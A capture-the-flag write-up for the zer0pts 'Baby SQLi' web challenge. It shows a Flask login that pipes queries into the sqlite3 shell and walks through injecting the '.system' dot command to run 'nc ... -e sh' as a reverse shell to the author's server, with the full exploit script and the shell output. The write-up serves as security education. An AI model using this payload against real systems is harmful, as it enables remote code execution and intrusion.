# Baby SQLi

**Category**: Web \
**Points**: 170 (30 solves) \
**Author**: ptr-yudai

## Challenge

Just login as admin. http://web.ctf.zer0pts.com:8004 \
Attachments: `baby_sqli.tar.gz`

## Solution

Despite being called Baby SQLi, this challenge was very hard for me.

Here's the challenge:
```python
import flask
import os
import re
import hashlib
import subprocess

app = flask.Flask(__name__)
app.secret_key = os.urandom(32)

def sqlite3_query(sql):
    p = subprocess.Popen(['sqlite3', 'database.db'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    o, e = p.communicate(sql.encode())
    if e:
        raise Exception(e)
    result = []
    for row in o.decode().split('\n'):
        if row == '': break
        result.append(tuple(row.split('|')))
    return result

def sqlite3_escape(s):
    return re.sub(r'([^_\.\sa-zA-Z0-9])', r'\\\1', s)

@app.route('/')
def home():
    msg = ''
    if 'msg' in flask.session:
        msg = flask.session['msg']
        del flask.session['msg']
    if 'name' in flask.session:
        return flask.render_template('index.html', name=flask.session['name'])
    else:
        return flask.render_template('login.html', msg=msg)

@app.route('/login', methods=['post'])
def auth():
    username = flask.request.form.get('username', default='', type=str)
    password = flask.request.form.get('password', default='', type=str)
    if len(username) > 32 or len(password) > 32:
        flask.session['msg'] = 'Too long username or password'
        return flask.redirect(flask.url_for('home'))

    password_hash = hashlib.sha256(password.encode()).hexdigest()
    result = None
    try:
        result = sqlite3_query(
            'SELECT * FROM users WHERE username="{}" AND password="{}";'
            .format(sqlite3_escape(username), password_hash)
        )
    except:
        pass

    if result:
        flask.session['name'] = username
    else:
        flask.session['msg'] = 'Invalid Credential'
    return flask.redirect(flask.url_for('home'))

if __name__ == '__main__':
    app.run(
        host='0.0.0.0',
        port=8888,
        debug=False,
        threaded=True
    )
```

The `sqlite3_escape()` function will add a backslash to any non-alphanumeric
character, excluding `.` (which will be useful later).

The issue here is that in SQLite, quotes are escaped by doubling them up rather
than using a backslash.
```
sqlite> SELECT "I ""like"" beans";
I "like" beans
sqlite> SELECT "I \"like\" beans";
Error: unrecognized token: "\"
```

Ok, let's try to inject an `OR ""=""` to make it return true.
```python
import requests

url = "http://localhost:8004"
username = '" OR ""='
assert len(username) <= 32
data = {"username": username, "password": "hi"}
res = requests.post(f"{url}/login", data)
print(res.text)
```

Turns out it's not that simple. Our SQL query ends up looking like this:
```
SELECT * FROM users WHERE username="\" OR \"\"\=" AND password="8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4";

Error: near line 1: unrecognized token: "\\"\n
```

Though we can escape the quotes, the backslashes always result in invalid
syntax, which causes SQL to throw an error. I was stuck here for a while until I
looked more closely at this:

```python
p = subprocess.Popen(['sqlite3', 'database.db'],
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE)
```

Now why the heck would they do that instead of using the `sqlite3` module? Then
I realized that since our output goes into the `sqlite3` command line shell, we
can inject dot commands like `.dump`, `.print`, and crucially, `.system`.

Let's try it:
```python
username = '";\n.system id\n'
```

It works! On my local setup, I printed the value of `o` to see this:
```
babysqli_1  | output: uid=1000(app) gid=1000(app)
```

With some trial and error, I found that I can also use special characters like
(`-`, `,`, and `|`) because the `sqlite3` command shell doesn't care about
backslashes.

But there's another catch:
```python
p = subprocess.Popen(['sqlite3', 'database.db'],
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE)
o, e = p.communicate(sql.encode())
if e:
    raise Exception(e)
```

If `stderr` contains anything, then an exception will be thrown and it won't let us
log in. The only way around this is to spawn a reverse shell like this:
```
nc $RHOST $RPORT -e sh
```

Let's try it:
```python
username = '";\n.system nc 34.67.42.222 6666 -e sh\n'
```

But this doesn't work because `username` is now 38 characters and the max is 32.
We can use a single digit port to bring us down to 35 characters. What else can
we shorten? Then I remembered that I can use the IP in
[decimal format](https://www.ipaddressguide.com/ip). So `34.67.42.222` becomes `574827230`, and our payload is now exactly 32 characters!

Final script:
```python
import requests

url = "http://web.ctf.zer0pts.com:8004"
username = '";\n.system nc 574827230 1 -e sh\n'
assert len(username) <= 32
data = {"username": username, "password": "hi"}
res = requests.post(f"{url}/login", data)
print(res.text)
```

On my server:
```
plushie@instance-1:~$ sudo -s
root@instance-1:/home/plushie# nc -lvnp 1
listening on [any] 1 ...
connect to [10.128.0.2] from (UNKNOWN) [165.227.180.221] 45301
ls
database.db
server.py
templates
cat templates/index.html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Welcome</title>
    </head>

    <body>
        <h1>Welcome, {{name}}!</h1>
        {% if name == 'admin' %}
        <p>zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p>
        {% else %}
        <p>No flag for you :(</p>
        {% endif %}
    </body>
</html>
```
